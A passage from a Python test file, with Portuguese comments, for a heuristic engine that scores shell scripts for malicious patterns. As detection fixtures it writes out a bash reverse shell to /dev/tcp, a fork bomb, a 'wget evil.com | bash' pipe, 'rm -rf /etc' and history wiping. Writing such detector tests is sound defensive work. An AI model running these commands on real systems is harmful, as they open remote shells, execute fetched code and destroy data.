            assert "reverse" in reason_lower or "shell" in reason_lower or "h006" in reason_lower.lower()

    def test_to_dict_has_required_keys(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "test.sh"
        f.write_bytes(b"#!/bin/bash\necho hello\n")
        r = engine.analyze(f)
        d = r.to_dict()
        for key in ("path", "score", "risk_level", "rules_fired",
                    "confidence", "analysis_ms", "matches"):
            assert key in d

    def test_analyze_missing_file_returns_empty(self, engine: HeuristicEngine) -> None:
        r = engine.analyze("/nonexistent/totally/missing/file.sh")
        assert r.score     == 0.0
        assert not r.matches

    def test_status(self, engine: HeuristicEngine) -> None:
        s = engine.status()
        assert s["enabled"]      is True
        assert s["rules_total"]  == 23
        assert s["rules_active"] == 23
        assert s["sensitivity"]  == "medium"

    def test_log_manager_called_on_suspicious(self, cfg: ConfigManager, tmp_path: Path) -> None:
        mock_log = MagicMock()
        mock_src = MagicMock()
        mock_log.get_source.return_value = mock_src

        eng = HeuristicEngine(cfg, log_manager=mock_log)
        f   = tmp_path / "suspicious.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
        eng.analyze(f)

        mock_log.get_source.assert_called_with("heuristics")
        mock_src.event.assert_called_once()

    def test_confidence_nonzero_for_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "script.sh"
        f.write_bytes(b"#!/bin/bash\necho hello\n")
        r = engine.analyze(f)
        assert r.confidence > 0

    def test_is_critical_property(self) -> None:
        r_crit = HeuristicResult(
            path="/x", score=90.0, risk_level="crítico",
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        r_alto = HeuristicResult(
            path="/y", score=70.0, risk_level="alto",
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        assert r_crit.is_critical is True
        assert r_alto.is_critical is False
        assert r_alto.is_suspicious is True

    def test_is_suspicious_clean_false(self) -> None:
        r = HeuristicResult(
            path="/z", score=5.0, risk_level=None,
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        assert r.is_suspicious is False
        assert r.is_critical   is False


# ---------------------------------------------------------------------------
# Testes: piso de severidade (achado 03:00 2026-08-29)
#
# Antes desta rodada, `_calculate_score` só somava `weight` — o campo
# `severity` de cada regra nunca influenciava o risk_level agregado (só era
# lido pela CLI, pra colorir a listagem de regras). Resultado real: uma
# regra "crítico" isolada (peso 10 = 20 pontos, longe do threshold 80 de
# "crítico") sempre saía como "baixo" — um reverse shell literal, fork bomb
# ou técnica fileless sozinhos nunca alcançavam a severidade que a própria
# regra declara. Ver EK-Protection.md pro relato completo do achado e do
# efeito em cadeia no ScanEngine (auto-quarentena nunca disparava).
# ---------------------------------------------------------------------------

class TestSeverityFloor:
    def test_single_critical_rule_reaches_critico(
        self, engine: HeuristicEngine, tmp_path: Path
    ) -> None:
        """H006 (reverse shell, severidade crítico) sozinho não pode
        ficar diluído em 'baixo' pela fórmula agregada."""
        f = tmp_path / "reverse.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
        r = engine.analyze(f)
        assert "H006" in r.rules_fired
        assert r.risk_level == "crítico"
        assert r.is_critical is True

    def test_single_fork_bomb_rule_reaches_critico(
        self, engine: HeuristicEngine, tmp_path: Path
    ) -> None:
        """H011 (fork bomb, severidade crítico) sozinho, mesma régua."""
        f = tmp_path / "bomb.sh"
        f.write_bytes(b"#!/bin/sh\n:(){ :|:& };:\n")
        r = engine.analyze(f)
        assert "H011" in r.rules_fired
        assert r.risk_level == "crítico"

    def test_single_high_severity_rule_reaches_alto(
        self, engine: HeuristicEngine, tmp_path: Path
    ) -> None:
        """H020 (download+chmod+x, severidade alto) sozinho não pode
        ficar abaixo de 'alto'."""
        f = tmp_path / "installer.sh"
        f.write_bytes(b"#!/bin/bash\nwget http://x.com/p.sh -O p.sh\nchmod +x p.sh\n")
        r = engine.analyze(f)
        assert "H020" in r.rules_fired
        assert _SEVERITY_RANK_FOR_TEST[r.risk_level] >= _SEVERITY_RANK_FOR_TEST["alto"]

    def test_floor_does_not_lower_score_based_risk(
        self, engine: HeuristicEngine, tmp_path: Path
    ) -> None:
        """Combinação de várias regras médias, cujo score agregado já
        supera qualquer severidade individual, não deve ser rebaixada
        pelo piso (o piso só eleva, nunca reduz)."""
        f = tmp_path / "multi.sh"
        f.write_bytes(
            b"#!/bin/bash\n"
            b"wget http://evil.com/payload | bash\n"   # H005 alto peso 8
            b"rm -rf /etc\n"                             # H010 crítico peso 9
            b":(){ :|:& };:\n"                           # H011 crítico peso 10
            b"history -c\n"                              # H012 médio peso 5
        )
        r = engine.analyze(f)
        # Score agregado sozinho pode ficar abaixo do threshold de 80 (é o
        # caso aqui) — o que importa é que o risk_level final não caia
        # abaixo da maior severidade entre as regras disparadas.
        assert r.risk_level == "crítico"

    def test_clean_file_unaffected_by_floor(
        self, engine: HeuristicEngine, tmp_path: Path
    ) -> None:
        f = tmp_path / "clean.txt"
        f.write_text("nothing suspicious here\n" * 5)
        r = engine.analyze(f)
        assert r.risk_level is None
        assert r.is_suspicious is False


_SEVERITY_RANK_FOR_TEST = {None: 0, "baixo": 1, "médio": 2, "alto": 3, "crítico": 4}
